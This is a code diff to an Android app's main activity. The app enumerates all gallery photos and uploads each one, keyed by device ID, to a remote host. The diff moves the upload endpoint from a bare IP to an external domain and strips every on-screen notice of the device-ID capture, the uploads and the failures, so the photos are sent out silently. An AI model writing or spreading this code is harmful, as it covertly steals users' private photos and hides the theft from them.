@@ -142,7 +142,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
             val lineEnd = "\r\n"
             val twoHyphens = "--"
-            val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
+            val url = java.net.URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.doInput = true
             conn.doOutput = true
@@ -168,10 +168,8 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
             val responseCode = conn.responseCode
             val response = conn.inputStream.bufferedReader().use { it.readText() }
-            showToast("✅ 上传成功 [$responseCode]: $fileName")
 
         } catch (e: Exception) {
-            showToast("❌ 上传失败: ${e.message}")
         }
     }
 
@@ -222,10 +220,8 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         if (deviceId.isNullOrBlank()) {
             deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
                 prefs.edit().putString("random_device_id", it).apply()
-                showToast("⚠️ 无法获取 Android_ID，生成随机设备 ID: $it")
             }
         } else {
-            showToast("📱 获取到设备 ID: $deviceId")
         }
 
         lifecycleScope.launch(Dispatchers.IO) {
@@ -249,12 +245,11 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                     val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
 
-                    showToast("📤 正在上传第 ${index + 1} 张: $name")
                     delay(index * 200L)
                     uploadImageToServer(uri, name, deviceId)
                     index++
                 }
-            } ?: showToast("❌ 无法读取相册")
+            }
         }
     }
 
